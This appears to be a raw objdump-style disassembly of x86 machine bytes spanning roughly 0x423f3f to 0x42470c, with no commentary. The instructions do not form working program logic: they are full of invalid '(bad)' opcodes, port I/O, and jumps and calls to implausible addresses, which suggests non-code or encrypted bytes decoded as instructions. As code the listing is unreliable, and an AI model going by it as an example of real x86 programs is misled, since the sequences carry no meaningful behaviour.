  423f3f:	mov    bl,0x78
  423f41:	cwde   
  423f42:	pop    esp
  423f43:	mov    bl,0x9d
  423f45:	mov    cl,0x3c
  423f47:	pusha  
  423f48:	mov    WORD PTR [esi+ebx*1],es
  423f4b:	adc    eax,0xc2d766e3
  423f50:	xor    cl,ch
  423f52:	pop    es
  423f53:	xor    al,0x71
  423f55:	dec    ebp
  423f56:	inc    eax
  423f57:	or     DWORD PTR [edx+edx*2+0x566556eb],ecx
  423f5e:	lahf   
  423f5f:	sahf   
  423f60:	(bad)  
  423f61:	(bad)  
  423f62:	pop    eax
  423f63:	lods   eax,DWORD PTR ds:[esi]
  423f64:	js     0x423f44
  423f66:	pushf  
  423f67:	cmp    BYTE PTR [edi],dh
  423f69:	xchg   ebx,eax
  423f6a:	sub    DWORD PTR [ecx-0x2007bbf],ecx
  423f70:	test   bl,dl
  423f72:	and    DWORD PTR [ecx-0x1aa93f5f],esp
  423f78:	lea    ecx,[ecx+0x5d1d1831]
  423f7e:	shr    DWORD PTR [edx-0x49],0x26
  423f82:	inc    edx
  423f83:	adc    bl,BYTE PTR [esp+eiz*2-0x62]
  423f87:	shl    DWORD PTR [esi-0x538b64fa],1
  423f8d:	icebp  
  423f8e:	jmp    0x423f6e
  423f90:	ret    0x856a
  423f93:	fs jb  0x423fff
  423f96:	mov    dl,0xfa
  423f98:	(bad)  
  423f99:	lea    eax,[ebx+0x5]
  423f9c:	jne    0x423f1e
  423f9e:	and    DWORD PTR [esi-0x7b5e1f92],0x76733cfc
  423fa8:	sub    DWORD PTR [ecx-0x55],0x21
  423fac:	fimul  DWORD PTR [esi]
  423fae:	jl     0x423fd0
  423fb0:	pmulhw mm7,QWORD PTR [eax+ecx*4]
  423fb4:	mov    WORD PTR gs:0xf72c62a5,ss
  423fbb:	stos   DWORD PTR es:[edi],eax
  423fbc:	dec    esp
  423fbd:	out    0xe5,al
  423fbf:	inc    ebx
  423fc0:	sub    edx,DWORD PTR [eax-0x47]
  423fc3:	push   esi
  423fc4:	shl    BYTE PTR [ebp+0x395dd478],cl
  423fca:	xor    eax,0x17c8da35
  423fcf:	fldenv [ecx+0x39]
  423fd2:	add    eax,0xbbf5722
  423fd7:	pop    ecx
  423fd8:	pop    ebp
  423fd9:	pop    ebx
  423fda:	adc    edi,0xffffffe7
  423fdd:	fs push es
  423fdf:	std    
  423fe0:	sub    BYTE PTR [ecx+0x24f051ef],dl
  423fe6:	jne    0x424017
  423fe8:	lock push esp
  423fea:	push   esp
  423feb:	imul   ebp,DWORD PTR [ebx],0xbdc8c36a
  423ff1:	xchg   al,ah
  423ff3:	jl     0x424050
  423ff5:	in     al,dx
  423ff6:	(bad)  
  423ff7:	fs scas al,BYTE PTR es:[edi]
  423ff9:	dec    esp
  423ffa:	sbb    dl,BYTE PTR [ecx]
  423ffc:	aam    0x3
  423ffe:	adc    DWORD PTR [eax+0x0],ebx
  424001:	mov    ebp,0x5a52be72
  424006:	mov    ah,0xa8
  424008:	mov    edx,0x5490e057
  42400d:	push   cs
  42400e:	mov    ebx,0x8e3c3127
  424013:	dec    edi
  424014:	lods   eax,DWORD PTR ds:[esi]
  424015:	jbe    0x424024
  424017:	ret    0x6797
  42401a:	dec    edi
  42401b:	cmp    al,0xdd
  42401d:	jge    0x423fbe
  42401f:	lds    edx,FWORD PTR [esi]
  424021:	in     eax,0xe1
  424023:	cld    
  424024:	inc    esi
  424025:	xor    bh,BYTE PTR [esi]
  424027:	iret   
  424028:	out    0x35,eax
  42402a:	adc    eax,DWORD PTR fs:[edi-0x37f3e120]
  424031:	lahf   
  424032:	push   esp
  424033:	adc    dl,dh
  424035:	push   ecx
  424036:	retf   
  424037:	es adc eax,0x99211196
  42403d:	pop    esi
  42403e:	mov    ?,WORD PTR [eax+0x7bfdbfad]
  424044:	jecxz  0x423fd9
  424046:	jne    0x4240ad
  424048:	push   cs
  424049:	fild   WORD PTR [edx+0x5a]
  42404c:	sub    edi,DWORD PTR [ebp-0x1a]
  42404f:	xor    BYTE PTR [ecx],dl
  424051:	mov    ebp,ebx
  424053:	inc    edx
  424054:	adc    BYTE PTR [ebp-0x19],al
  424057:	adc    ecx,DWORD PTR [ebx-0x64f8f2dd]
  42405d:	xchg   BYTE PTR [edx],bh
  42405f:	stc    
  424060:	aas    
  424061:	pop    eax
  424062:	fld    DWORD PTR [ebx-0x34fbfa5b]
  424068:	daa    
  424069:	pop    es
  42406a:	sub    esi,DWORD PTR [eax-0xa]
  42406d:	sahf   
  42406e:	mov    dl,0xe3
  424070:	mov    edi,0xf9fc672c
  424075:	(bad)  
  424076:	retf   0xde15
  424079:	jecxz  0x4240e0
  42407b:	and    BYTE PTR [esi+0x1e],al
  42407e:	lock mov ds:0x46f8998b,eax
  424084:	push   0x18a8f708
  424089:	inc    edx
  42408a:	daa    
  42408b:	or     eax,0x25662646
  424090:	leave  
  424091:	and    BYTE PTR [edi],dh
  424093:	call   0xfc0d9051
  424098:	jnp    0x4240e5
  42409a:	fild   DWORD PTR [ebx+0x49]
  42409d:	adc    esi,0x9fb36229
  4240a3:	fadd   DWORD PTR [ecx]
  4240a5:	cdq    
  4240a6:	enter  0x30d7,0x3f
  4240aa:	jecxz  0x4240b6
  4240ac:	lods   eax,DWORD PTR ds:[esi]
  4240ad:	adc    eax,0xf2bf3a59
  4240b2:	ficom  WORD PTR [edx]
  4240b4:	pop    ds
  4240b5:	xchg   ebx,eax
  4240b6:	cmc    
  4240b7:	jmp    0x73700a25
  4240bc:	cmp    ebx,DWORD PTR [ebx+0x3c00e9d7]
  4240c2:	add    BYTE PTR [eax-0x1123717c],ah
  4240c8:	int    0xa0
  4240ca:	pop    ds
  4240cb:	aam    0x27
  4240cd:	xchg   ecx,eax
  4240ce:	fild   WORD PTR fs:[ebx]
  4240d1:	ret    
  4240d2:	jmp    0x4240db
  4240d4:	xchg   ebx,eax
  4240d5:	or     al,0xab
  4240d7:	mov    edx,0x650435fb
  4240dc:	(bad)  
  4240dd:	(bad)  
  4240de:	mov    ds:0x96aa6feb,eax
  4240e4:	jmp    0x5b86fc7e
  4240e9:	int    0x96
  4240eb:	int    0x67
  4240ed:	int    0xa3
  4240ef:	sbb    cl,dh
  4240f1:	outs   dx,BYTE PTR ds:[esi]
  4240f2:	fmul   QWORD PTR [edx+ebp*8+0x3d517e2b]
  4240f9:	push   edi
  4240fa:	mov    eax,ds:0xa9358164
  4240ff:	ins    BYTE PTR es:[edi],dx
  424100:	pop    eax
  424101:	fnstcw WORD PTR [ecx+0x2e308ede]
  424107:	faddp  st(7),st
  424109:	push   cs
  42410a:	fidivr DWORD PTR [ebp+0x73]
  42410d:	out    dx,eax
  42410e:	jmp    0xe1b9614b
  424113:	add    DWORD PTR [ebx+0xa81dfe5],ebp
  424119:	push   esp
  42411a:	mov    DWORD PTR [eax],edi
  42411c:	bound  ebp,QWORD PTR [esi]
  42411e:	mov    ebx,0xbbed4716
  424123:	call   0x38334f28
  424128:	jb     0x4240ac
  42412a:	mov    bh,0x6
  42412c:	sub    BYTE PTR [esi],dl
  42412e:	fsubr  QWORD PTR [edi-0x37]
  424131:	stc    
  424132:	xchg   ebp,eax
  424133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424134:	aaa    
  424135:	xor    al,0x31
  424137:	repz adc BYTE PTR [esp+ecx*8+0x0],ah
  42413c:	les    ecx,FWORD PTR [eax-0x69]
  42413f:	arpl   dx,cx
  424141:	icebp  
  424142:	cmp    al,0xe3
  424144:	imul   ebp,DWORD PTR [esi+0x534c60e],0xee18af1a
  42414e:	aam    0xc3
  424150:	cs jbe 0x424182
  424153:	clc    
  424154:	retf   0x8e9
  424157:	ds push ss
  424159:	je     0x42419f
  42415b:	int3   
  42415c:	jo     0x424109
  42415e:	cs or  ebp,esi
  424161:	sbb    BYTE PTR [eax+0x7022435c],0xc9
  424168:	int    0x6e
  42416a:	mov    edi,0xc71441e0
  42416f:	pushw  0x3c
  424172:	inc    esi
  424173:	pusha  
  424174:	test   ax,0x8581
  424178:	xor    eax,DWORD PTR [edx]
  42417a:	mov    edx,0x20bc952c
  42417f:	mov    ebp,0x8620c863
  424184:	push   ds
  424185:	mov    cl,dl
  424187:	cmp    eax,0x309ab64a
  42418c:	in     eax,0x12
  42418e:	mov    WORD PTR [ebx],fs
  424190:	bswap  eax
  424192:	repz push es
  424194:	dec    eax
  424195:	inc    esi
  424196:	je     0x42415d
  424198:	jb     0x4241d0
  42419a:	ja     0x4241b0
  42419c:	fsub   DWORD PTR [esi+0x76]
  42419f:	popa   
  4241a0:	jp     0x424142
  4241a2:	add    BYTE PTR [ebp+0x67],cl
  4241a5:	clc    
  4241a6:	adc    eax,0xe01de1bc
  4241ab:	mov    BYTE PTR [edx+0x7ea9a1c8],cl
  4241b1:	mov    ebp,DWORD PTR [ebx]
  4241b3:	push   es
  4241b4:	mov    gs:0xfc42f2ef,eax
  4241ba:	outs   dx,BYTE PTR ds:[esi]
  4241bb:	xchg   ch,ah
  4241bd:	imul   edi,DWORD PTR [esi+ecx*4],0x7ab53d03
  4241c4:	xchg   ebx,eax
  4241c5:	hlt    
  4241c6:	push   eax
  4241c7:	stos   DWORD PTR es:[edi],eax
  4241c8:	sbb    al,0xd1
  4241ca:	mov    esp,0xdb298a7b
  4241cf:	imul   ebp
  4241d1:	or     dh,dh
  4241d3:	cmp    BYTE PTR [esi-0x4781a9e6],dl
  4241d9:	pop    es
  4241da:	push   ebp
  4241db:	aaa    
  4241dc:	ret    0x4326
  4241df:	inc    eax
  4241e0:	adc    bl,BYTE PTR [edx]
  4241e2:	addr16 out dx,eax
  4241e4:	or     al,0x51
  4241e6:	push   ss
  4241e7:	cmp    DWORD PTR [ebp-0x52],0x8504bb6c
  4241ee:	mov    cl,0x46
  4241f0:	aas    
  4241f1:	inc    eax
  4241f2:	push   es
  4241f3:	mov    esi,0xeb86bd4a
  4241f8:	jno    0x4241d4
  4241fa:	mov    bh,0x47
  4241fc:	mov    edx,0x24dd6193
  424201:	push   0x1d
  424203:	add    eax,0x391fc5a6
  424208:	data16 sub cl,dh
  42420b:	test   BYTE PTR [esi+eax*8],bh
  42420e:	mov    cl,0x30
  424210:	shl    BYTE PTR cs:[esi+0x13],1
  424214:	sahf   
  424215:	jg     0x424269
  424217:	jp     0x424245
  424219:	mov    ds:0x61b85215,al
  42421e:	mov    dl,0xab
  424220:	mov    al,ds:0x2b74dff4
  424225:	(bad)  
  424226:	lods   al,BYTE PTR ds:[esi]
  424227:	dec    ebx
  424228:	cmp    eax,DWORD PTR [edx-0x2a]
  42422b:	and    al,0x31
  42422d:	call   0xbffedd56
  424232:	jo     0x424296
  424234:	xlat   BYTE PTR ds:[ebx]
  424235:	pop    ecx
  424236:	push   edx
  424237:	mov    cl,BYTE PTR [ecx-0x3223ac98]
  42423d:	inc    edi
  42423e:	xchg   edx,eax
  42423f:	sbb    al,0x5b
  424241:	out    0x81,eax
  424243:	enter  0xda6c,0x36
  424247:	adc    edi,esp
  424249:	mov    cl,0x8b
  42424b:	pop    ecx
  42424c:	sahf   
  42424d:	retf   0xfdb6
  424250:	into   
  424251:	leave  
  424252:	pop    ds
  424253:	mov    ds:0x18c17be0,eax
  424258:	xor    esp,DWORD PTR [eax-0x16]
  42425b:	jne    0x42421a
  42425d:	pop    esp
  42425e:	int3   
  42425f:	rol    BYTE PTR [eax],1
  424261:	out    0x47,eax
  424263:	mov    eax,0xe973a8d2
  424268:	jecxz  0x424223
  42426a:	aaa    
  42426b:	popf   
  42426c:	cs call 0x3a01:0xbfdf3972
  424274:	pop    es
  424275:	push   cs
  424276:	xchg   esp,eax
  424277:	and    dl,BYTE PTR [esi+0x7eacf49b]
  42427d:	inc    ecx
  42427e:	out    dx,eax
  42427f:	jp     0x4242d8
  424281:	mov    dh,0x7
  424283:	jae    0x4242db
  424285:	xor    al,0x27
  424287:	icebp  
  424288:	inc    edi
  424289:	fs jne 0x4242ee
  42428c:	push   ecx
  42428d:	xor    eax,ebx
  42428f:	jmp    0x6cf3f1f3
  424294:	cdq    
  424295:	or     BYTE PTR [ebp+0x1a],ah
  424298:	mov    BYTE PTR [edx-0x1c122b45],ah
  42429e:	and    BYTE PTR [edx],dl
  4242a0:	(bad)  
  4242a1:	push   0x4f19363f
  4242a6:	mul    BYTE PTR ds:0x4b0a6830
  4242ac:	sbb    BYTE PTR [ebp-0x3b],ch
  4242af:	inc    esi
  4242b0:	xchg   esi,eax
  4242b1:	das    
  4242b2:	cmp    bh,BYTE PTR [ebx+0x19]
  4242b5:	add    BYTE PTR [edi],ch
  4242b7:	sbb    eax,0x9644c1d5
  4242bc:	and    eax,0x7500ed29
  4242c1:	push   es
  4242c2:	ds push ss
  4242c4:	js     0x4242a5
  4242c6:	fidiv  DWORD PTR [eax+0x65]
  4242c9:	iret   
  4242ca:	add    al,0xf6
  4242cc:	add    ah,BYTE PTR [edi+0x1f]
  4242cf:	pop    ds
  4242d0:	xor    edi,DWORD PTR [ebp+0xf37383c]
  4242d6:	je     0x42430e
  4242d8:	je     0x4242bd
  4242da:	dec    eax
  4242db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242dc:	pop    ecx
  4242dd:	loop   0x424349
  4242df:	mov    edi,0xc4b28a0d
  4242e4:	lea    ecx,[edx-0x34]
  4242e7:	mov    ?,WORD PTR [ecx+0x17]
  4242ea:	dec    esi
  4242eb:	inc    ebx
  4242ec:	stos   BYTE PTR es:[edi],al
  4242ed:	gs int 0x16
  4242f0:	dec    ecx
  4242f1:	mov    BYTE PTR [ebp-0x1b],ah
  4242f4:	xor    eax,0xf748ad81
  4242f9:	ror    BYTE PTR [esi+0x68],cl
  4242fc:	sub    eax,0x1fb77b40
  424301:	cmp    eax,0xee02f4aa
  424306:	jae    0x42435b
  424308:	pop    ebp
  424309:	push   ebp
  42430a:	mov    dl,BYTE PTR [eax-0x7f]
  42430d:	dec    esp
  42430e:	cwde   
  42430f:	sbb    eax,0xccdb932b
  424314:	fsub   DWORD PTR [ebx+0x35]
  424317:	jge    0x42431e
  424319:	in     eax,dx
  42431a:	mov    ch,0x32
  42431c:	out    0x74,eax
  42431e:	sbb    al,0xcf
  424320:	test   dl,bl
  424322:	dec    edi
  424323:	js     0x42434c
  424325:	enter  0x4ac5,0xc7
  424329:	js     0x424303
  42432b:	or     ebp,ecx
  42432d:	aaa    
  42432e:	imul   eax,edi,0x72
  424331:	pushf  
  424332:	fucomp st(1)
  424334:	stos   DWORD PTR es:[edi],eax
  424335:	xchg   esp,eax
  424336:	push   edi
  424337:	addr16 (bad) 
  424339:	sbb    ebx,esp
  42433b:	dec    edx
  42433c:	out    0x9e,eax
  42433e:	fsub   DWORD PTR [di]
  424341:	rcr    BYTE PTR [esi+0x7e],1
  424344:	(bad)  
  424346:	jns    0x4242e1
  424348:	shl    BYTE PTR [edx+0x71bc1673],cl
  42434e:	test   DWORD PTR [edx+0x64],0xeba999c5
  424355:	mov    DWORD PTR [eax+0x7e55fef0],esp
  42435b:	sub    BYTE PTR [eax],cl
  42435d:	adc    dh,ah
  42435f:	ins    DWORD PTR es:[edi],dx
  424360:	in     al,0xb3
  424362:	ins    BYTE PTR es:[edi],dx
  424363:	imul   ecx,DWORD PTR [ebx+0x60a222c6],0xffffff80
  42436a:	adc    eax,0xcb98a620
  42436f:	icebp  
  424370:	xor    BYTE PTR ds:0xe1743b06,bl
  424376:	inc    BYTE PTR [ecx+0x5a]
  424379:	pop    ecx
  42437a:	arpl   ax,dx
  42437c:	push   ds
  42437d:	xchg   esp,eax
  42437e:	sbb    ah,BYTE PTR [ecx-0x7763f8b2]
  424384:	pop    ebx
  424385:	iret   
  424386:	lds    ecx,FWORD PTR [esi+0x1a5744c2]
  42438c:	ins    BYTE PTR es:[edi],dx
  42438d:	jecxz  0x4243ae
  42438f:	into   
  424390:	aad    0x6f
  424392:	cmp    DWORD PTR [ebx+0x45],edi
  424395:	inc    esi
  424396:	and    DWORD PTR [ebp-0x1f],ebx
  424399:	int3   
  42439a:	push   ebx
  42439b:	cld    
  42439c:	jecxz  0x424390
  42439e:	pop    ecx
  42439f:	(bad)  
  4243a0:	pop    edi
  4243a1:	xor    al,dl
  4243a3:	jbe    0x42439a
  4243a5:	push   cs
  4243a6:	pop    ebx
  4243a7:	(bad)
  4243aa:	jb     0x4243c8
  4243ac:	call   DWORD PTR [edi*4-0x6e851b59]
  4243b4:	popf   
  4243b5:	loop   0x4243a2
  4243b7:	sbb    DWORD PTR [ecx+0x24],esp
  4243ba:	jle    0x42443b
  4243bc:	bound  ecx,QWORD PTR [edi+eax*8+0x23]
  4243c0:	mov    WORD PTR [edx-0x3b2521fa],fs
  4243c6:	dec    ebx
  4243c7:	jae    0x424358
  4243c9:	scas   al,BYTE PTR es:[edi]
  4243ca:	mov    ?,ecx
  4243cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243cd:	dec    esp
  4243ce:	pop    edi
  4243cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243d0:	adc    DWORD PTR [eax-0x2d],0x10
  4243d4:	add    al,0x2f
  4243d6:	sbb    esp,ecx
  4243d8:	(bad)  [esi+0x31fa4d5a]
  4243de:	lods   eax,DWORD PTR ds:[esi]
  4243df:	div    DWORD PTR [edx-0x36]
  4243e2:	cmp    ecx,DWORD PTR [ebp-0x46d0f6bf]
  4243e8:	sub    al,0xe7
  4243ea:	fwait
  4243eb:	rcl    DWORD PTR [edi+0x38],cl
  4243ee:	mov    esp,0xd0444c16
  4243f3:	enter  0x4f31,0xb5
  4243f7:	dec    ebx
  4243f8:	pop    eax
  4243f9:	and    eax,0x186d87f0
  4243fe:	popa   
  4243ff:	inc    esp
  424400:	or     esi,esp
  424402:	xchg   ebx,eax
  424403:	in     al,dx
  424404:	loope  0x424448
  424406:	add    eax,0x6d5d486a
  42440b:	retf   
  42440c:	sub    edi,eax
  42440e:	add    DWORD PTR [ecx+0x4],ecx
  424411:	cli    
  424412:	push   ebp
  424413:	clc    
  424414:	mov    edx,0x11efaa80
  424419:	out    dx,eax
  42441a:	femms  
  42441c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42441d:	add    BYTE PTR [eax],al
  42441f:	add    BYTE PTR [eax],al
  424421:	add    BYTE PTR [edx+ebx*8],ch
  424424:	iret   
  424425:	cmp    bh,0x95
  424428:	outs   dx,DWORD PTR ds:[esi]
  424429:	(bad)  
  42442a:	jecxz  0x4243f5
  42442c:	push   ds
  42442d:	ins    DWORD PTR es:[edi],dx
  42442e:	sar    cl,1
  424430:	push   ss
  424431:	add    al,0x16
  424433:	mov    ebp,0x4f30001
  424438:	add    BYTE PTR [eax],al
  42443a:	mov    esi,DWORD PTR [ecx]
  42443c:	test   DWORD PTR [eax+ebx*4+0x61],esi
  424440:	push   esp
  424441:	add    BYTE PTR [edx+0x29],0x7c
  424445:	int    0xe0
  424447:	and    al,0x2e
  424449:	xor    al,0xfa
  42444b:	xor    eax,0xed67618d
  424450:	push   0xffffffd5
  424452:	pop    ds
  424453:	dec    edx
  424454:	xor    ebx,DWORD PTR [esi]
  424456:	pop    ecx
  424457:	jmp    0x424400
  424459:	loope  0x4244a3
  42445b:	xchg   ebp,eax
  42445c:	sub    BYTE PTR [esi],bl
  42445e:	jmp    0x8293:0xae678327
  424465:	pop    ss
  424466:	lea    esp,[eax-0x4d5920e1]
  42446c:	mov    edi,0x52a21662
  424471:	lahf   
  424472:	push   cs
  424473:	xor    eax,DWORD PTR [esi+eax*2+0x398c91a0]
  42447a:	and    al,BYTE PTR [ecx+0x76]
  42447d:	(bad)
  424480:	repnz cwde 
  424482:	in     eax,0x93
  424484:	(bad)
  424487:	aaa    
  424488:	push   0xffffffc9
  42448a:	popa   
  42448b:	std    
  42448c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42448d:	lahf   
  42448e:	test   al,0x15
  424490:	jge    0x424503
  424492:	add    BYTE PTR [eax-0x6d800d4e],ah
  424498:	push   ds
  424499:	cld    
  42449a:	mov    al,ds:0x5a749926
  42449f:	popa   
  4244a0:	pusha  
  4244a1:	call   0x2916a351
  4244a6:	outs   dx,BYTE PTR ds:[esi]
  4244a7:	mov    cl,0x20
  4244a9:	cli    
  4244aa:	dec    ebx
  4244ab:	(bad)  
  4244ad:	mov    cl,0xff
  4244af:	jmp    0x42448f
  4244b1:	adc    BYTE PTR ds:0x5b9684e9,dl
  4244b7:	push   ecx
  4244b8:	add    ebx,DWORD PTR [edx+0x4f]
  4244bb:	cmp    bl,ch
  4244bd:	add    al,0xbb
  4244bf:	hlt    
  4244c0:	and    ebp,DWORD PTR [eax-0x337778d6]
  4244c6:	push   es
  4244c7:	sub    ecx,eax
  4244c9:	or     ecx,DWORD PTR ds:[ecx-0x3a4626a]
  4244d0:	scas   al,BYTE PTR es:[edi]
  4244d1:	sti    
  4244d2:	dec    ebp
  4244d3:	mov    DWORD PTR [eax+0x5be13cff],edi
  4244d9:	jp     0x42445d
  4244db:	test   eax,0x4de15104
  4244e0:	jmp    0x4244e4
  4244e2:	add    ebp,esp
  4244e4:	lock ins DWORD PTR es:[edi],dx
  4244e6:	loope  0x4244e2
  4244e8:	test   eax,0x4d390ba6
  4244ed:	inc    ebx
  4244ee:	mov    dl,0xc2
  4244f0:	pusha  
  4244f1:	lds    ecx,FWORD PTR [edx-0x2d]
  4244f4:	ficomp DWORD PTR [eax]
  4244f6:	pop    ecx
  4244f7:	scas   eax,DWORD PTR es:[edi]
  4244f8:	pop    ebx
  4244f9:	das    
  4244fa:	sbb    eax,0x7e25af43
  4244ff:	lea    ebp,[ebp+0x42]
  424502:	xchg   DWORD PTR [edi+0x3],edi
  424505:	push   0xfa10c038
  42450a:	gs std 
  42450c:	cwde   
  42450d:	outs   dx,DWORD PTR ds:[esi]
  42450e:	retf   
  42450f:	ret    
  424510:	jp     0x424538
  424512:	daa    
  424513:	pop    ss
  424514:	bound  eax,QWORD PTR [edx]
  424516:	fstp   DWORD PTR [ecx+0x4a]
  424519:	les    eax,FWORD PTR [edi-0x668136dd]
  42451f:	div    DWORD PTR [ebp+0x596c54f4]
  424525:	clc    
  424526:	add    ecx,DWORD PTR [ebp+0x36]
  424529:	(bad)  
  42452a:	fbld   TBYTE PTR [ebx+ebp*1]
  42452d:	push   esp
  42452e:	xchg   esp,eax
  42452f:	imul   esi,DWORD PTR [edx],0xba356776
  424535:	or     al,0x65
  424537:	xchg   ebx,eax
  424538:	xchg   edx,eax
  424539:	push   eax
  42453a:	test   eax,0xe5791a80
  42453f:	pop    edx
  424540:	int3   
  424541:	or     eax,0x91408b5b
  424546:	mov    ah,0xf0
  424548:	jb     0x424543
  42454a:	mov    ebp,0x36fc3cc3
  42454f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424550:	sub    esp,esp
  424552:	jmp    0x62c6:0x589300da
  424559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42455a:	outs   dx,DWORD PTR ds:[esi]
  42455b:	or     eax,0x4855760c
  424560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424561:	ss stc 
  424563:	add    ebp,ebx
  424565:	sub    ah,BYTE PTR [edi-0xb216044]
  42456b:	loopne 0x42457e
  42456d:	jbe    0x4245bf
  42456f:	pop    esp
  424570:	fcom   DWORD PTR [edx]
  424572:	jmp    0x375e3670
  424577:	dec    edi
  424578:	test   cl,bl
  42457a:	push   ecx
  42457b:	jl     0x42453e
  42457d:	cmp    BYTE PTR [esi],bl
  42457f:	jp     0x424503
  424581:	mov    al,ds:0xa9784452
  424586:	fst    DWORD PTR [ebx]
  424588:	(bad)  [ecx]
  42458a:	aas    
  42458b:	pop    es
  42458c:	pop    ss
  42458d:	test   BYTE PTR [ecx-0x6205de5f],al
  424593:	aaa    
  424594:	fistp  WORD PTR [ecx+0x31a3d66b]
  42459a:	mov    ds:0xc7c8c60f,eax
  42459f:	sahf   
  4245a0:	iret   
  4245a1:	sbb    cl,BYTE PTR [eax+0x35]
  4245a4:	jecxz  0x424532
  4245a6:	cmp    al,al
  4245a8:	jnp    0x4245c4
  4245aa:	inc    edx
  4245ab:	sub    DWORD PTR [ecx+ecx*1-0x29d9d69c],edx
  4245b2:	pop    edx
  4245b3:	xor    ah,BYTE PTR [ecx]
  4245b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245b6:	(bad)  
  4245b7:	ins    DWORD PTR es:[edi],dx
  4245b8:	nop
  4245b9:	fs pop edx
  4245bb:	push   eax
  4245bc:	in     al,0x0
  4245be:	outs   dx,DWORD PTR ds:[esi]
  4245bf:	xor    dh,0x4d
  4245c2:	aaa    
  4245c3:	xlat   BYTE PTR ds:[ebx]
  4245c4:	out    dx,eax
  4245c5:	ss aas 
  4245c7:	jne    0x424562
  4245c9:	outs   dx,BYTE PTR ds:[esi]
  4245ca:	sbb    eax,0xfc47735d
  4245cf:	pop    ebp
  4245d0:	outs   dx,BYTE PTR ds:[esi]
  4245d1:	mov    dh,0x63
  4245d3:	pop    ecx
  4245d4:	dec    DWORD PTR [edx]
  4245d6:	or     DWORD PTR ds:0x37da99b7,0xf0979001
  4245e0:	cld    
  4245e1:	or     ebx,DWORD PTR [edx+esi*4]
  4245e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245e5:	shr    DWORD PTR [edx-0x51c027b8],1
  4245eb:	test   BYTE PTR ds:0x681bcb3,bh
  4245f1:	dec    edx
  4245f2:	outs   dx,BYTE PTR ds:[esi]
  4245f3:	fmulp  st(2),st
  4245f5:	inc    edi
  4245f6:	or     DWORD PTR [edi+eax*8-0x5f08d37c],edi
  4245fd:	or     bl,dl
  4245ff:	mov    ebp,0x20787548
  424604:	retf   
  424605:	xor    al,BYTE PTR [esi-0x6e6acdb2]
  42460b:	stos   DWORD PTR es:[edi],eax
  42460c:	fild   WORD PTR [eax+0x78a0b01c]
  424612:	fstp   DWORD PTR [eax+0x4838726]
  424618:	dec    esp
  424619:	sbb    al,BYTE PTR [esp+eax*4]
  42461c:	push   eax
  42461d:	mov    WORD PTR [ebp-0x75f5c84a],ss
  424623:	cmp    DWORD PTR [esi+0x611bdc48],0x7f
  42462a:	xor    BYTE PTR [ecx],cl
  42462c:	sbb    bl,0xc6
  42462f:	pop    eax
  424630:	cmp    DWORD PTR [esi-0x12],0x34f79c69
  424637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424638:	or     al,0x71
  42463a:	pop    edx
  42463b:	cmp    cl,BYTE PTR ds:0xeda944e6
  424641:	inc    ebx
  424642:	int3   
  424643:	(bad)  
  424644:	add    DWORD PTR [esi],eax
  424646:	pop    ebx
  424647:	mov    WORD PTR [ebp+eiz*2+0x71],ss
  42464b:	jmp    0xa590:0x8ac40e3a
  424652:	adc    al,0xf0
  424654:	jns    0x4246a0
  424656:	cmc    
  424657:	jge    0x424668
  424659:	in     al,dx
  42465a:	push   0xffffffc5
  42465c:	fcmovb st,st(6)
  42465e:	ins    BYTE PTR es:[edi],dx
  42465f:	femms  
  424661:	fcmovnb st,st(6)
  424663:	out    dx,eax
  424664:	add    bl,0xee
  424667:	xlat   BYTE PTR ds:[ebx]
  424668:	outs   dx,BYTE PTR ds:[esi]
  424669:	inc    esi
  42466a:	xlat   BYTE PTR ds:[ebx]
  42466b:	mov    ebx,0x8770fb44
  424670:	call   0x345062ce
  424675:	pop    edi
  424676:	lahf   
  424677:	rcl    BYTE PTR [edx+0x63],cl
  42467a:	popa   
  42467b:	add    cl,bh
  42467d:	int3   
  42467e:	mov    esi,0x80ffa1aa
  424683:	push   gs
  424685:	jl     0x42465b
  424687:	test   al,0x7a
  424689:	sbb    eax,DWORD PTR ds:0x665433e6
  42468f:	aas    
  424690:	enter  0x4b59,0x20
  424694:	xchg   ebp,eax
  424695:	push   esi
  424696:	inc    eax
  424697:	xchg   DWORD PTR ds:0x84700c29,ecx
  42469d:	retf   
  42469e:	xchg   ebx,eax
  42469f:	ins    BYTE PTR es:[edi],dx
  4246a0:	sub    DWORD PTR [edi+0x23],ecx
  4246a3:	lods   eax,DWORD PTR ds:[esi]
  4246a4:	(bad)  
  4246a5:	sti    
  4246a6:	fiadd  WORD PTR [edx+0x275cf93]
  4246ac:	stos   DWORD PTR es:[edi],eax
  4246ad:	imul   ebp,DWORD PTR ds:0xa5b49799,0x30
  4246b4:	inc    esi
  4246b5:	imul   eax,DWORD PTR [ecx-0xc],0x4b
  4246b9:	test   DWORD PTR [eax+0x37],edi
  4246bc:	in     eax,0xe1
  4246be:	cwde   
  4246bf:	dec    edi
  4246c0:	push   edx
  4246c1:	ret    0x8fc0
  4246c4:	inc    eax
  4246c5:	js     0x4246bb
  4246c7:	ror    BYTE PTR [eax+0x57],0xc4
  4246cb:	clc    
  4246cc:	stos   BYTE PTR es:[edi],al
  4246cd:	cmp    BYTE PTR [ecx],ch
  4246cf:	sub    dl,ch
  4246d1:	nop
  4246d2:	jae    0x42474a
  4246d4:	push   0x37225ae0
  4246d9:	mov    DWORD PTR [eax-0x3b2cece1],ebx
  4246df:	dec    eax
  4246e0:	call   0x98481641
  4246e5:	jl     0x42473e
  4246e7:	dec    edx
  4246e8:	(bad)  
  4246e9:	mov    al,ds:0x7ddeabd4
  4246ee:	mov    ebp,?
  4246f0:	ret    0x1a9d
  4246f3:	mov    edx,0x2a3fa1d8
  4246f8:	mov    cl,0x5e
  4246fa:	mov    esp,DWORD PTR [ebp+0x37f19989]
  424700:	add    esi,DWORD PTR [ecx+0x4c]
  424703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424704:	mov    DWORD PTR [ecx+0x44efa640],edi
  42470a:	adc    al,0xb9
  42470c:	sti    
